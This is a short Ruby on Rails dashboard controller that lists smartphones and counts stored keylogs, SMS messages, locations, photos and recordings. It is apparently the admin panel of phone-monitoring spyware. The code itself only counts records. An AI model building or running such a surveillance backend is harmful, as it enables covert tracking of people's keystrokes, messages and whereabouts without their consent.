class DashboardsController < ActionController::Base
  def index
    @devices = Smartphone.all.order(updated_at: :desc)
    @stats = {
      devices: @devices.count,
      keylogs: Keylog.count,
      sms: SmsMessage.count,
      locations: GeoLocation.count,
      photos: Picture.count,
      recordings: Recording.count
    }
    render layout: false
  end
end
